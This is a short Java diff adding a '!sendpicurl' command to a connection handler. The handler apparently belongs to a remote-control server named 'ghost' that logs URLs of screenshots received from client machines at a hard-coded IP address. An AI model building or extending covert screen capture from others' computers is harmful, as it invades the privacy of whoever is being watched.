@@ -99,6 +99,15 @@ public class HandleConn extends Thread{
                             ServerMain.cmdProcessFinish();
                             continue;
                         }
+                        case "!sendpicurl":{
+                            try{
+                                Out.say("HandleConn","获取到新截图,url:http://39.100.5.139/ghost/"+ServerMain.fileReceiver.getRootPath()+cmd[1]);
+                            }catch (Exception e){
+                                ;
+                            }
+                            ServerMain.cmdProcessFinish();
+                            continue;
+                        }
                         case "!info":{
                             if (cmd.length<4){
                                 Out.say("conn"+hostName,"客户端提供的info语法不正确");
